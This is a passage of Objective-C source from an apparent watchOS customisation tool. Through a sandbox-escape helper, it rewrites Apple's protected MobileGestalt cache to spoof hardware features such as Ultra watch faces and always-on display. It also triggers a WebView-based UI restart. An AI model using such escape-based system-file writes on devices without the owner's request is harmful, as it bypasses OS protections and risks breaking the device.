        if (fd >= 0) {
            BOOL ok = (ftruncate(fd, 0) == 0) &&
                      bq_write_all(fd, data.bytes, data.length) &&
                      (fsync(fd) == 0);
            if (!ok && original.length) {
                BQLog(@"in-place write failed; rolling back original (%lu bytes)", (unsigned long)original.length);
                ftruncate(fd, 0);
                lseek(fd, 0, SEEK_SET);
                bq_write_all(fd, original.bytes, original.length);
                fsync(fd);
            }
            close(fd);
            if (ok) return YES;
            BQLog(@"in-place write failed, falling back to atomic");
        } else {
            BQLog(@"in-place open failed: %s", strerror(errno));
        }
    }
    NSString *tmp = [path stringByAppendingString:@".bqtmp"];
    if (![data writeToFile:tmp atomically:NO]) {
        if (err) *err = @"temp write failed";
        return NO;
    }
    int fd = open(tmp.fileSystemRepresentation, O_RDONLY);
    if (fd >= 0) { fsync(fd); close(fd); }
    int r = rename(tmp.fileSystemRepresentation, path.fileSystemRepresentation);
    if (r != 0) {
        if (err) *err = [NSString stringWithFormat:@"rename failed: %s", strerror(errno)];
        unlink(tmp.fileSystemRepresentation);
        return NO;
    }
    return YES;
}

NSMutableDictionary *BQLoadGestalt(NSString **err) {
    NSString *link = nil;
    int64_t h = BQEscape(kMGCaches, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return nil;
    }
    NSString *plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    NSData *data = [NSData dataWithContentsOfFile:plist];
    NSMutableDictionary *dict = [NSMutableDictionary dictionaryWithContentsOfFile:plist];
    if (data.length && !BQBackupExists()) {
        [data writeToFile:BQBackupPath() atomically:YES];
        BQLog(@"MG backup created (%lu bytes)", (unsigned long)data.length);
    }
    BQEndEscape(h);
    if (!dict) {
        if (err) *err = @"MobileGestalt plist missing or invalid";
        return nil;
    }
    BQLog(@"MG loaded: %lu CacheExtra key(s), %lu byte(s)",
          (unsigned long)[dict[@"CacheExtra"] count], (unsigned long)data.length);
    return dict;
}

BOOL BQSaveGestalt(NSDictionary *dict, NSString **err) {
    if (![dict isKindOfClass:[NSDictionary class]]) {
        if (err) *err = @"invalid dictionary";
        return NO;
    }
    NSError *e = nil;
    NSData *data = [NSPropertyListSerialization dataWithPropertyList:dict
                                                              format:NSPropertyListBinaryFormat_v1_0
                                                             options:0 error:&e];
    if (!data.length) {
        if (err) *err = [NSString stringWithFormat:@"serialize failed: %@", e];
        return NO;
    }
    NSString *link = nil;
    int64_t h = BQEscape(kMGCaches, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return NO;
    }
    NSString *plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    BOOL ok = bq_write_data(plist, data, err);
    if (ok) {
        NSMutableDictionary *check = [NSMutableDictionary dictionaryWithContentsOfFile:plist];
        if (!check) {
            ok = NO;
            if (err) *err = @"post-write verification failed";
        } else {
            BQLog(@"MG saved: %lu bytes, %lu CacheExtra keys",
                  (unsigned long)data.length, (unsigned long)[check[@"CacheExtra"] count]);
        }
    }
    BQEndEscape(h);
    return ok;
}

BOOL BQRestoreGestalt(NSString **err) {
    NSData *backup = [NSData dataWithContentsOfFile:BQBackupPath()];
    if (!backup.length) {
        if (err) *err = @"backup not found";
        return NO;
    }
    NSString *link = nil;
    int64_t h = BQEscape(kMGCaches, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return NO;
    }
    NSString *plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    BOOL ok = bq_write_data(plist, backup, err);
    if (ok) {
        NSMutableDictionary *check = [NSMutableDictionary dictionaryWithContentsOfFile:plist];
        ok = (check != nil);
        BQLog(@"MG restored: %lu bytes ok=%d", (unsigned long)backup.length, ok);
    }
    BQEndEscape(h);
    return ok;
}

typedef struct {
    const char *build;
    const char *cacheUUID;
    NSUInteger dataLength;
    NSUInteger valueOffset;
    NSUInteger presentOffset;
} BQDeviceBrandLayout;

static const BQDeviceBrandLayout kDeviceBrandLayouts[] = {
    {"24S5284h", "DB380F61-0014-418D-9799-876666B459E3", 0x1950, 0x348, 0x16e9},
    {"24R364", "6F8372B0-1583-4031-A4BC-A54A18B0DD5A", 0x1947, 0x348, 0x16e1},
    {"24R365", "6F8372B0-1583-4031-A4BC-A54A18B0DD5A", 0x1947, 0x348, 0x16e1},
    {"24S118", "32B4CA84-FBDA-496C-9B79-2101D597158B", 0x1950, 0x348, 0x16e9},
    {"24S132", "32B4CA84-FBDA-496C-9B79-2101D597158B", 0x1950, 0x348, 0x16e9},
};

BOOL BQSetHermesEnabled(BOOL enabled, NSString **err) {
    if (!BQBackupExists()) {
        if (err) *err = @"Back up MobileGestalt first.";
        return NO;
    }
    NSData *backup = [NSData dataWithContentsOfFile:BQBackupPath()];
    id backupPlist = backup ? [NSPropertyListSerialization propertyListWithData:backup options:0 format:NULL error:NULL] : nil;
    if (![backupPlist isKindOfClass:[NSDictionary class]]) {
        if (err) *err = @"The MobileGestalt backup is invalid.";
        return NO;
    }
    NSMutableDictionary *plist = BQLoadGestalt(err);
    if (!plist) return NO;
    char build[128] = {0};
    size_t buildLength = sizeof(build);
    if (sysctlbyname("kern.osversion", build, &buildLength, NULL, 0) != 0) {
        if (err) *err = @"Could not identify the watchOS build.";
        return NO;
    }
    const BQDeviceBrandLayout *layout = NULL;
    for (size_t i = 0; i < sizeof(kDeviceBrandLayouts) / sizeof(kDeviceBrandLayouts[0]); i++) {
        if (strcmp(build, kDeviceBrandLayouts[i].build) == 0) {
            layout = &kDeviceBrandLayouts[i];
            break;
        }
    }
    if (!layout) {
        if (err) *err = [NSString stringWithFormat:@"DeviceBrand CacheData layout is not verified for build %s.", build];
        return NO;
    }
    id extra = plist[@"CacheExtra"];
    id cacheData = plist[@"CacheData"];
    id backupExtra = backupPlist[@"CacheExtra"];
    id backupCacheData = backupPlist[@"CacheData"];
    if (![extra isKindOfClass:[NSDictionary class]] || ![cacheData isKindOfClass:[NSData class]] ||
        ![backupExtra isKindOfClass:[NSDictionary class]] || ![backupCacheData isKindOfClass:[NSData class]] ||
        ![plist[@"CacheUUID"] isEqual:[NSString stringWithUTF8String:layout->cacheUUID]] ||
        ![backupPlist[@"CacheUUID"] isEqual:[NSString stringWithUTF8String:layout->cacheUUID]] ||
        [cacheData length] != layout->dataLength || [backupCacheData length] != layout->dataLength ||
        layout->valueOffset > layout->dataLength - sizeof(uint32_t) ||
        layout->presentOffset >= layout->dataLength) {
        if (err) *err = @"Unexpected MobileGestalt cache layout; no changes written.";
        return NO;
    }
    const NSUInteger valueOffset = layout->valueOffset;
    const NSUInteger presentOffset = layout->presentOffset;
    NSMutableData *modifiedData = [cacheData mutableCopy];
    uint8_t *bytes = modifiedData.mutableBytes;
    const uint8_t *backupBytes = (const uint8_t *)[backupCacheData bytes];
    if (enabled && bytes[presentOffset] != 1) {
        if (err) *err = @"DeviceBrand is not present in CacheData; no changes written.";
        return NO;
    }
    // DeviceBrand is a little-endian signed 32-bit integer, in an 8-byte slot.
    const uint8_t one[] = {1, 0, 0, 0};
    if (enabled) memcpy(bytes + valueOffset, one, sizeof(one));
    else {
        memcpy(bytes + valueOffset, backupBytes + valueOffset, sizeof(uint32_t));
        bytes[presentOffset] = backupBytes[presentOffset];
    }
    NSMutableDictionary *changed = [extra mutableCopy];
    NSString *brandKey = @"fuKL2rMywRgQF1wowOA/cg";
    id originalBrandOverride = backupExtra[brandKey];
    if (enabled || !originalBrandOverride) [changed removeObjectForKey:brandKey];
    else changed[brandKey] = originalBrandOverride;
    plist[@"CacheData"] = modifiedData;
    plist[@"CacheExtra"] = changed;
    if (!BQSaveGestalt(plist, err)) return NO;
    NSMutableDictionary *check = BQLoadGestalt(err);
    NSData *saved = check[@"CacheData"];
    NSDictionary *savedExtra = check[@"CacheExtra"];
    if (![saved isKindOfClass:[NSData class]] || saved.length != layout->dataLength ||
        ![savedExtra isKindOfClass:[NSDictionary class]]) {
        if (err) *err = @"The cache was written, but DeviceBrand could not be verified.";
        return NO;
    }
    const uint8_t *savedBytes = (const uint8_t *)saved.bytes;
    BOOL dataMatches = enabled
        ? (memcmp(savedBytes + valueOffset, one, sizeof(one)) == 0 && savedBytes[presentOffset] == 1)
        : (memcmp(savedBytes + valueOffset, backupBytes + valueOffset, sizeof(uint32_t)) == 0 &&
           savedBytes[presentOffset] == backupBytes[presentOffset]);
    BOOL extraMatches = originalBrandOverride ? [savedExtra[brandKey] isEqual:originalBrandOverride]
                                              : savedExtra[brandKey] == nil;
    if (!dataMatches || !extraMatches) {
        if (err) *err = @"The cache was written, but DeviceBrand could not be verified.";
        return NO;
    }
    return YES;
}

BOOL BQEnableHermes(NSString **err) {
    return BQSetHermesEnabled(YES, err);
}

BOOL BQGetHermesEnabled(BOOL *enabled, NSString **err) {
    NSMutableDictionary *plist = BQLoadGestalt(err);
    if (!plist) return NO;
    char build[128] = {0};
    size_t buildLength = sizeof(build);
    if (sysctlbyname("kern.osversion", build, &buildLength, NULL, 0) != 0) {
        if (err) *err = @"Could not identify the watchOS build.";
        return NO;
    }
    const BQDeviceBrandLayout *layout = NULL;
    for (size_t i = 0; i < sizeof(kDeviceBrandLayouts) / sizeof(kDeviceBrandLayouts[0]); i++) {
        if (strcmp(build, kDeviceBrandLayouts[i].build) == 0) {
            layout = &kDeviceBrandLayouts[i];
            break;
        }
    }
    NSData *cacheData = plist[@"CacheData"];
    if (!layout || ![cacheData isKindOfClass:[NSData class]] ||
        ![plist[@"CacheUUID"] isEqual:[NSString stringWithUTF8String:layout->cacheUUID]] ||
        cacheData.length != layout->dataLength || layout->valueOffset > layout->dataLength - sizeof(uint32_t)) {
        if (err) *err = @"DeviceBrand CacheData layout is unavailable or unverified.";
        return NO;
    }
    const uint8_t *bytes = (const uint8_t *)cacheData.bytes;
    BOOL isHermes = bytes[layout->presentOffset] == 1 &&
        bytes[layout->valueOffset] == 1 && bytes[layout->valueOffset + 1] == 0 &&
        bytes[layout->valueOffset + 2] == 0 && bytes[layout->valueOffset + 3] == 0;
    if (enabled) *enabled = isHermes;
    return YES;
}

// main-screen-class CacheData layouts derived from each build’s MobileGestalt table.
static BOOL bq_ultraCache(NSDictionary *plist, NSMutableData **dataOut, NSUInteger *valueOffset, NSUInteger *presentOffset, NSString **err) {
    char build[128] = {0};
    size_t buildLength = sizeof(build);
    if (sysctlbyname("kern.osversion", build, &buildLength, NULL, 0) != 0) {
        if (err) *err = @"Could not identify the watchOS build.";
        return NO;
    }
    NSString *uuid = nil;
    NSUInteger length = 0, value = 0, present = 0;
    if (strcmp(build, "24S5284h") == 0) uuid = @"DB380F61-0014-418D-9799-876666B459E3";
    else if (strcmp(build, "24S132") == 0 || strcmp(build, "24S118") == 0) uuid = @"32B4CA84-FBDA-496C-9B79-2101D597158B";
    else if (strcmp(build, "24R364") == 0 || strcmp(build, "24R365") == 0) {
        uuid = @"6F8372B0-1583-4031-A4BC-A54A18B0DD5A";
        length = 0x1947; value = 0xea8; present = 0x184d;
    }
    if (uuid && length == 0) { length = 0x1950; value = 0xeb0; present = 0x1856; }
    NSData *data = plist[@"CacheData"];
    if (!uuid || ![plist[@"CacheUUID"] isEqual:uuid] || ![data isKindOfClass:[NSData class]] || data.length != length || ![plist[@"CacheExtra"] isKindOfClass:[NSDictionary class]]) {
        if (err) *err = @"Ultra Faces cache layout is not supported on this watchOS build.";
        return NO;
    }
    if (dataOut) *dataOut = [data mutableCopy];
    if (valueOffset) *valueOffset = value;
    if (presentOffset) *presentOffset = present;
    return YES;
}

BOOL BQGetUltraFacesEnabled(BOOL *enabled, NSString **err) {
    NSDictionary *plist = BQLoadGestalt(err);
    NSMutableData *data = nil;
    NSUInteger valueOffset = 0, presentOffset = 0;
    if (!plist || !bq_ultraCache(plist, &data, &valueOffset, &presentOffset, err)) return NO;
    const uint8_t *bytes = data.bytes;
    const uint8_t ultra[] = {29, 0, 0, 0};
    if (enabled) *enabled = plist[@"CacheExtra"][@"fdh+s6j3VijuyrK7xLjd7g"] == nil && bytes[presentOffset] == 1 && memcmp(bytes + valueOffset, ultra, sizeof(ultra)) == 0;
    return YES;
}

BOOL BQSetUltraFacesEnabled(BOOL enabled, NSString **err) {
    NSData *backupFile = [NSData dataWithContentsOfFile:BQBackupPath()];
    NSDictionary *backup = backupFile ? [NSPropertyListSerialization propertyListWithData:backupFile options:0 format:NULL error:NULL] : nil;
    if (![backup isKindOfClass:[NSDictionary class]]) {
        if (err) *err = @"Back up MobileGestalt first.";
        return NO;
    }
    NSMutableDictionary *plist = BQLoadGestalt(err);
    NSMutableData *data = nil, *original = nil;
    NSUInteger valueOffset = 0, presentOffset = 0;
    if (!plist || !bq_ultraCache(plist, &data, &valueOffset, &presentOffset, err) || !bq_ultraCache(backup, &original, NULL, NULL, err)) return NO;
    uint8_t *bytes = data.mutableBytes;
    const uint8_t *backupBytes = original.bytes;
    if (enabled && bytes[presentOffset] != 1) {
        if (err) *err = @"main-screen-class is not present in CacheData.";
        return NO;
    }
    const uint8_t ultra[] = {29, 0, 0, 0};
    if (enabled) memcpy(bytes + valueOffset, ultra, sizeof(ultra));
    else {
        memcpy(bytes + valueOffset, backupBytes + valueOffset, sizeof(ultra));
        bytes[presentOffset] = backupBytes[presentOffset];
    }
    NSString *key = @"fdh+s6j3VijuyrK7xLjd7g";
    NSMutableDictionary *extra = [plist[@"CacheExtra"] mutableCopy];
    id originalOverride = backup[@"CacheExtra"][key];
    if (enabled || !originalOverride) [extra removeObjectForKey:key];
    else extra[key] = originalOverride;
    plist[@"CacheData"] = data;
    plist[@"CacheExtra"] = extra;
    if (!BQSaveGestalt(plist, err)) return NO;
    NSDictionary *saved = BQLoadGestalt(err);
    NSMutableData *savedData = nil;
    if (!saved || !bq_ultraCache(saved, &savedData, NULL, NULL, err)) return NO;
    const uint8_t *savedBytes = savedData.bytes;
    id expectedOverride = enabled ? nil : originalOverride;
    id savedOverride = saved[@"CacheExtra"][key];
    if (memcmp(savedBytes + valueOffset, bytes + valueOffset, sizeof(ultra)) != 0 || savedBytes[presentOffset] != bytes[presentOffset] || (expectedOverride ? ![savedOverride isEqual:expectedOverride] : savedOverride != nil)) {
        if (err) *err = @"Ultra Faces cache changes could not be verified.";
        return NO;
    }
    return YES;
}

static BOOL bq_setMGCacheExtraKeys(NSArray<NSString *> *keys, BOOL enabled, NSString **err) {
    if (!BQBackupExists()) {
        if (err) *err = @"Back up MobileGestalt first.";
        return NO;
    }

    NSMutableDictionary *plist = BQLoadGestalt(err);
    if (!plist) return NO;
    id cacheExtra = plist[@"CacheExtra"];
    if (![cacheExtra isKindOfClass:[NSDictionary class]]) {
        if (err) *err = @"MobileGestalt CacheExtra is missing or invalid.";
        return NO;
    }

    NSMutableDictionary *updated = [cacheExtra mutableCopy];
    NSNumber *storedValue = @(enabled);
    for (NSString *key in keys) updated[key] = storedValue;
    plist[@"CacheExtra"] = updated;
    if (!BQSaveGestalt(plist, err)) return NO;

    NSMutableDictionary *check = BQLoadGestalt(err);
    NSDictionary *savedExtra = check[@"CacheExtra"];
    for (NSString *key in keys) {
        id value = savedExtra[key];
        if (![value respondsToSelector:@selector(boolValue)] || [value boolValue] != enabled) {
            if (err) *err = [NSString stringWithFormat:@"MobileGestalt override %@ did not save the requested state.", key];
            return NO;
        }
    }
    BQLog(@"MG CacheExtra %@ %@", enabled ? @"enabled" : @"disabled", [keys componentsJoinedByString:@", "]);
    return YES;
}

static BOOL bq_getMGCacheExtraKeys(NSArray<NSString *> *keys, BOOL *enabled, NSString **err) {
    if (!BQCoreInit()) {
        if (err) *err = @"MobileGestalt access is unavailable on this device.";
        return NO;
    }
    NSMutableDictionary *plist = BQLoadGestalt(err);
    if (!plist) return NO;
    id cacheExtra = plist[@"CacheExtra"];
    if (![cacheExtra isKindOfClass:[NSDictionary class]]) {
        if (err) *err = @"MobileGestalt CacheExtra is missing or invalid.";
        return NO;
    }
    BOOL allEnabled = YES;
    NSDictionary *extra = cacheExtra;
    for (NSString *key in keys) {
        id value = extra[key];
        if (![value respondsToSelector:@selector(boolValue)] || ![value boolValue]) {
            allEnabled = NO;
            break;
        }
    }
    if (enabled) *enabled = allEnabled;
    return YES;
}

BOOL BQGetAODSupport(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"2OOJf1VhaM7NxfRok3HbWQ",
        @"j8/Omm6s1lsmTDFsXjsBfA"
    ], enabled, err);
}

BOOL BQGetAODSecondsSupport(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"aoJSd/MXk7M40NgXTM6x+g"
    ], enabled, err);
}

BOOL BQGetActionButton(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"FBw/2WrPE2supEKosxxoTw"
    ], enabled, err);
}

BOOL BQGetDoubleTap(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"l1CWke97nbaAcWDqA6T5LA"
    ], enabled, err);
}

BOOL BQGetDepthCapability(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"Ijs+pw5tRyxqSy5kfgZNuQ" // DeviceSupportsAbsoluteDepth
    ], enabled, err);
}

BOOL BQGetAbsoluteAltimeter(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"PFnuFyqMMnGUQQnTqS5byg" // DeviceSupportsAbsoluteAltimeter
    ], enabled, err);
}

BOOL BQGetAlwaysOnCompass(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"aCQx2Qq/TChnNAq1rr6Egw" // DeviceSupportsAlwaysOnCompass
    ], enabled, err);
}

BOOL BQGetAODVibrancy(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"ykpu7qyhqFweVMKtxNylWA" // DeviceSupportsAODVibrancy
    ], enabled, err);
}

BOOL BQGetWatchKeyboard(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"MQJ1mlVrhOwaUUVJehJSVA" // WatchKeyboardCapability
    ], enabled, err);
}

BOOL BQGetPeriodicALSUpdates(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"Leuy56dCZmAMYoVCQGTfPA" // DeviceSupportsPeriodicALSUpdates
    ], enabled, err);
}

BOOL BQGetRaiseToSpeak(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"4D8XW4YwJI7QvyPhv1TEdw" // DeviceSupportsRaiseToSpeak
    ], enabled, err);
}

BOOL BQGetContinuousHeartRate(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"W2RPjaqovtsgiRB6ScePGA" // DeviceSupportsContinuousHeartRate
    ], enabled, err);
}

BOOL BQGetCompassOrienteering(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"GPIs61LYNpcwZqwlFr7bbg" // DeviceSupportsCompassOrienteering
    ], enabled, err);
}

BOOL BQGetEnvironmentalDosimetry(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"SaW+DA+cbiqDHrex8MTABA" // DeviceSupportsEnvironmentalDosimetry
    ], enabled, err);
}

BOOL BQGetBatteryInformation(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"Kao6GNYdAy5hwXblxeGYJQ" // DeviceSupportsBatteryInformation
    ], enabled, err);
}

BOOL BQGetAlwaysListening(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"U+73bmG4kBGj6kpreQXUTQ" // DeviceSupportsAlwaysListening
    ], enabled, err);
}

BOOL BQGetRotateToWake(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"nmOy2K5HzAAs2QNAi8wR+Q" // SupportsRotateToWake
    ], enabled, err);
}

BOOL BQGetSwimmingWorkouts(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"cRjPy4Ef+KZwJ+nfPeBV5Q" // DeviceSupportsSwimmingWorkouts
    ], enabled, err);
}

BOOL BQSetAODSupport(BOOL enabled, NSString **err) {
    // DeviceSupportsAlwaysOnDisplay is the main capability; ClockKit also
    // reads DeviceSupportsAlwaysOnTime while loading CLKDevice information.
    return bq_setMGCacheExtraKeys(@[
        @"2OOJf1VhaM7NxfRok3HbWQ", // DeviceSupportsAlwaysOnDisplay
        @"j8/Omm6s1lsmTDFsXjsBfA"  // DeviceSupportsAlwaysOnTime
    ], enabled, err);
}

BOOL BQSetAODSecondsSupport(BOOL enabled, NSString **err) {
    // Enables the AOD flipbook path used by BacklightServices 1 Hz updates.
    return bq_setMGCacheExtraKeys(@[
        @"aoJSd/MXk7M40NgXTM6x+g" // DeviceSupportsAlwaysOnDisplayFlipbook
    ], enabled, err);
}

BOOL BQSetActionButton(BOOL enabled, NSString **err) {
    // NanoCompassWaypoints 27.3b1 implements isUltraDevice() by calling
    // MGGetBoolAnswer("WatchAppButtonCapability"). The CacheExtra hash below
    // is the matching MobileGestalt key hash present in this build.
    return bq_setMGCacheExtraKeys(@[
        @"FBw/2WrPE2supEKosxxoTw"
    ], enabled, err);
}

BOOL BQSetDoubleTap(BOOL enabled, NSString **err) {
    // WatchGestures' WAGDeviceSupportsElton() calls
    // MGGetBoolAnswer("DeviceSupportsElton"); Double Tap is handled as Elton.
    return bq_setMGCacheExtraKeys(@[
        @"l1CWke97nbaAcWDqA6T5LA" // DeviceSupportsElton
    ], enabled, err);
}

BOOL BQSetDepthCapability(BOOL enabled, NSString **err) {
    // Depth sensor capability used by supported Apple Watch models.
    return bq_setMGCacheExtraKeys(@[
        @"Ijs+pw5tRyxqSy5kfgZNuQ" // DeviceSupportsAbsoluteDepth
    ], enabled, err);
}

BOOL BQSetAbsoluteAltimeter(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"PFnuFyqMMnGUQQnTqS5byg" // DeviceSupportsAbsoluteAltimeter
    ], enabled, err);
}

BOOL BQSetAlwaysOnCompass(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"aCQx2Qq/TChnNAq1rr6Egw" // DeviceSupportsAlwaysOnCompass
    ], enabled, err);
}

BOOL BQSetAODVibrancy(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"ykpu7qyhqFweVMKtxNylWA" // DeviceSupportsAODVibrancy
    ], enabled, err);
}

BOOL BQSetPeriodicALSUpdates(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"Leuy56dCZmAMYoVCQGTfPA" // DeviceSupportsPeriodicALSUpdates
    ], enabled, err);
}

BOOL BQSetWatchKeyboard(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"MQJ1mlVrhOwaUUVJehJSVA" // WatchKeyboardCapability
    ], enabled, err);
}

BOOL BQSetRaiseToSpeak(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"4D8XW4YwJI7QvyPhv1TEdw" // DeviceSupportsRaiseToSpeak
    ], enabled, err);
}

BOOL BQSetContinuousHeartRate(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"W2RPjaqovtsgiRB6ScePGA" // DeviceSupportsContinuousHeartRate
    ], enabled, err);
}

BOOL BQSetCompassOrienteering(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"GPIs61LYNpcwZqwlFr7bbg" // DeviceSupportsCompassOrienteering
    ], enabled, err);
}

BOOL BQSetEnvironmentalDosimetry(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"SaW+DA+cbiqDHrex8MTABA" // DeviceSupportsEnvironmentalDosimetry
    ], enabled, err);
}

BOOL BQSetBatteryInformation(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"Kao6GNYdAy5hwXblxeGYJQ" // DeviceSupportsBatteryInformation
    ], enabled, err);
}

BOOL BQSetAlwaysListening(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"U+73bmG4kBGj6kpreQXUTQ" // DeviceSupportsAlwaysListening
    ], enabled, err);
}

BOOL BQSetRotateToWake(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"nmOy2K5HzAAs2QNAi8wR+Q" // SupportsRotateToWake
    ], enabled, err);
}

BOOL BQSetSwimmingWorkouts(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"cRjPy4Ef+KZwJ+nfPeBV5Q" // DeviceSupportsSwimmingWorkouts
    ], enabled, err);
}


// NeoSpring from Gester, with UIKit and WebKit accessed dynamically on watchOS.
static id gRespringWebView;
static id gRespringOverlay;

static id bq_send_id(id object, const char *name) {
    return ((id (*)(id, SEL))objc_msgSend)(object, sel_registerName(name));
}

static id bq_key_window(void) {
    Class applicationClass = NSClassFromString(@"UIApplication");
    id application = bq_send_id(applicationClass, "sharedApplication");
    if (!application) return nil;
    id scenes = bq_send_id(application, "connectedScenes");
    for (id scene in scenes) {
        if (![scene respondsToSelector:sel_registerName("windows")]) continue;
        for (id window in bq_send_id(scene, "windows")) {
            if (((BOOL (*)(id, SEL))objc_msgSend)(window, sel_registerName("isKeyWindow"))) return window;
        }
    }
    if ([application respondsToSelector:sel_registerName("windows")]) {
        return [bq_send_id(application, "windows") firstObject];
    }
    return nil;
}

void BQRespring(void) {
    dispatch_async(dispatch_get_main_queue(), ^{
        void *webKit = dlopen("/System/Library/Frameworks/WebKit.framework/WebKit", RTLD_NOW | RTLD_LOCAL);
        if (!webKit) { BQLog(@"respring: WebKit unavailable: %s", dlerror()); return; }
        Class viewClass = NSClassFromString(@"UIView");
        Class colorClass = NSClassFromString(@"UIColor");
        Class spinnerClass = NSClassFromString(@"UIActivityIndicatorView");
        Class configurationClass = NSClassFromString(@"WKWebViewConfiguration");
        Class webViewClass = NSClassFromString(@"WKWebView");
        NSString *path = [[NSBundle mainBundle] pathForResource:@"respring" ofType:@"html"];
        id win = bq_key_window();
        if (!win || !viewClass || !colorClass || !spinnerClass || !configurationClass || !webViewClass || !path.length) {
            BQLog(@"respring: required window, classes or HTML unavailable");
            return;
        }
        CGRect bounds = ((CGRect (*)(id, SEL))objc_msgSend)(win, sel_registerName("bounds"));
        id black = ((id (*)(id, SEL, CGRect))objc_msgSend)(bq_send_id(viewClass, "alloc"), sel_registerName("initWithFrame:"), bounds);
        ((void (*)(id, SEL, id))objc_msgSend)(black, sel_registerName("setBackgroundColor:"), bq_send_id(colorClass, "blackColor"));
        ((void (*)(id, SEL, NSUInteger))objc_msgSend)(black, sel_registerName("setAutoresizingMask:"), 18);
        ((void (*)(id, SEL, id))objc_msgSend)(win, sel_registerName("addSubview:"), black);
        id spinner = ((id (*)(id, SEL, NSInteger))objc_msgSend)(bq_send_id(spinnerClass, "alloc"), sel_registerName("initWithActivityIndicatorStyle:"), 101);
        ((void (*)(id, SEL, CGPoint))objc_msgSend)(spinner, sel_registerName("setCenter:"), CGPointMake(CGRectGetMidX(bounds), CGRectGetMidY(bounds)));
        ((void (*)(id, SEL, NSUInteger))objc_msgSend)(spinner, sel_registerName("setAutoresizingMask:"), 45);
        ((void (*)(id, SEL, id))objc_msgSend)(spinner, sel_registerName("setColor:"), bq_send_id(colorClass, "whiteColor"));
        ((void (*)(id, SEL))objc_msgSend)(spinner, sel_registerName("startAnimating"));
        ((void (*)(id, SEL, id))objc_msgSend)(black, sel_registerName("addSubview:"), spinner);
        gRespringOverlay = black;
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.25 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            id config = bq_send_id(configurationClass, "new");
            id preferences = bq_send_id(config, "defaultWebpagePreferences");
            ((void (*)(id, SEL, BOOL))objc_msgSend)(preferences, sel_registerName("setAllowsContentJavaScript:"), YES);
            id webView = ((id (*)(id, SEL, CGRect, id))objc_msgSend)(bq_send_id(webViewClass, "alloc"), sel_registerName("initWithFrame:configuration:"), bounds, config);
            ((void (*)(id, SEL, NSUInteger))objc_msgSend)(webView, sel_registerName("setAutoresizingMask:"), 18);
            ((void (*)(id, SEL, BOOL))objc_msgSend)(webView, sel_registerName("setUserInteractionEnabled:"), NO);
            ((void (*)(id, SEL, id, id))objc_msgSend)(win, sel_registerName("insertSubview:belowSubview:"), webView, black);
            NSURL *url = [NSURL fileURLWithPath:path];
            ((id (*)(id, SEL, id, id))objc_msgSend)(webView, sel_registerName("loadFileURL:allowingReadAccessToURL:"), url, url.URLByDeletingLastPathComponent);
            gRespringWebView = webView;
            BQLog(@"respring: NeoSpring started");
        });
    });
}
